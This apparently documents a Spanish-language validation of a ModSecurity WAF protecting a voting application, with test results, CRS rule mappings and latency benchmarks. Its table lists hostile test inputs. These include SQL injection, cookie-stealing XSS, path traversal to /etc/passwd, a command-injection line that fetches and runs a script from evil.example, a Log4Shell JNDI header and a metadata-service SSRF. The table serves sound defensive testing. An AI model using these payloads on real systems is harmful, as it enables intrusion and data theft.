# Validación del WAF (escenario de seguridad 4)

Configuración del WAF: [`waf/README.md`](../../waf/README.md). Escenario de calidad y
patrón: [`docs/entregables/P3/p3_2c.md`](../entregables/P3/p3_2c.md#escenario-4-web-application-firewall).

## 1. Ataques y tráfico legítimo — `verify-waf.sh`

```
$ bash docs/p3-waf/verify-waf.sh
Ataques (deben dar 403):
  ✔ block   403  SQLi en query (tautología)
  ✔ block   403  SQLi UNION SELECT en query
  ✔ block   403  SQLi en el JSON de login
  ✔ block   403  SQLi en la web (BFF)
  ✔ block   403  XSS reflejado en query
  ✔ block   403  XSS en el cuerpo JSON
  ✔ block   403  XSS en la web
  ✔ block   403  Path traversal en la ruta
  ✔ block   403  Path traversal codificado en query
  ✔ block   403  Inyección de comandos (Unix)
  ✔ block   403  Inyección de comandos en JSON
  ✔ block   403  Log4Shell / JNDI en cabecera
  ✔ block   403  Escáner (User-Agent sqlmap)
  ✔ block   403  Escáner (User-Agent Nikto)
  ✔ block   403  Acceso a archivo sensible (.env)
  ✔ block   403  Inclusión remota de archivos (RFI)

Tráfico legítimo (no debe dar 403):
  ✔ allow   200  Catálogo de rutas del Gateway
  ✔ allow   200  Salud del Gateway
  ✔ allow   200  Elecciones abiertas (API)
  ✔ allow   200  Login con credenciales válidas
  ✔ allow   401  Login con contraseña con símbolos
  ✔ allow   401  Ruta protegida sin token (401)
  ✔ allow   200  Página de inicio (web)
  ✔ allow   200  Página de login (web)
  ✔ allow   200  Elecciones abiertas vía BFF (web)

Resultado: 25 correctos, 0 fallidos.
```

Reglas del CRS registradas en el log de auditoría (sin contar la 949110, que es la que
bloquea al superar el umbral):

| Petición | Reglas |
|---|---|
| `?id=1' OR '1'='1` | 942100 (SQLi, libinjection) |
| `UNION SELECT username,password FROM users--` | 942100, 942190, 942270, 942360 |
| `?q=1;DROP TABLE users--` (web) | 942100, 942350, 942360 |
| `<script>alert(1)</script>` | 941100, 941110, 941160, 941390 |
| `<svg/onload=alert(document.cookie)>` (web) | 941100, 941120, 941160, 941180, 941390 |
| `/api/elections/open/../../../etc/passwd` | 930100, 930110 |
| `?file=..%2f..%2f..%2fetc%2fpasswd` | 930100, 930110, 930120, 932160 |
| `?host=127.0.0.1;cat /etc/passwd` | 930120, 932160 |
| `$(curl http://evil.example/x.sh\|sh)` en JSON | 932130, 932235, 932250 |
| `X-Api-Version: ${jndi:ldap://…}` | 944150 |
| `User-Agent: sqlmap` / `Nikto` | 913100 |
| `/.env` | 930130 |
| `?page=http://169.254.169.254/…` | 931100, 934110 |

Nota: un *traversal* que sube por encima de la raíz (`/api/../../../../etc/passwd`) lo
rechaza nginx con `400` antes de que lo evalúe ModSecurity. También se detiene en el borde.

**Las peticiones bloqueadas no llegan al Gateway:** después de la batería de pruebas,
`docker compose logs gateway | grep -ciE 'UNION|etc/passwd|script|jndi|sqlmap'` da `0`.

## 2. Sin falsos positivos en el flujo real

- `python3 docs/demo/e2e_vote.py` a través del WAF (`localhost:8088`): login + MFA de
  administrador y votante, creación de la urna, inscripción, token ciego, papeleta
  cifrada, recibo, reenvío idempotente, cierre y escrutinio. Todo respondió 200/201.
- Web a través del WAF (`localhost:3000`): login + MFA por el BFF con cookie de sesión,
  `/api/auth/me`, páginas `/` y `/login`. Ningún 403.
- No hizo falta ninguna exclusión (`REQUEST-900-…` vacío) y se mantuvo la paranoia 1.

## 3. Costo en latencia (k6)

`docs/lab6-performance/performance_test.js` (`GET /api/elections/open`), 30 s por corrida,
con k6 dentro de la red de Docker y el límite de tasa desactivado. Datos crudos en `results/`.

| VUs | Ruta | avg (ms) | mediana (ms) | p95 (ms) | req/s | errores |
|---:|---|---:|---:|---:|---:|---:|
| 1 | Gateway directo | 8,0 | 7,1 | 14,8 | 1,0 | 0 % |
| 1 | WAF → Gateway | 13,1 | 13,9 | 18,0 | 1,0 | 0 % |
| 50 | Gateway directo | 15,3 | 10,5 | 48,2 | 48,9 | 0 % |
| 50 | WAF → Gateway | 19,8 | 15,0 | 49,6 | 48,5 | 0 % |

El WAF agrega unos 5 ms por petición, con el mismo *throughput* y sin errores.

```bash
docker compose -f docker-compose.yml -f docs/lab6-performance/docker-compose.perf.yml up -d gateway
for t in gateway waf; do
  docker run --rm --network votaciones_default -v "$PWD/docs/lab6-performance:/scripts:ro" \
    -e BASE_URL=http://$t:8088 -e VUS=50 -e DURATION=30s grafana/k6:0.54.0 run /scripts/performance_test.js
done
docker compose up -d gateway   # restaura el límite de tasa
```
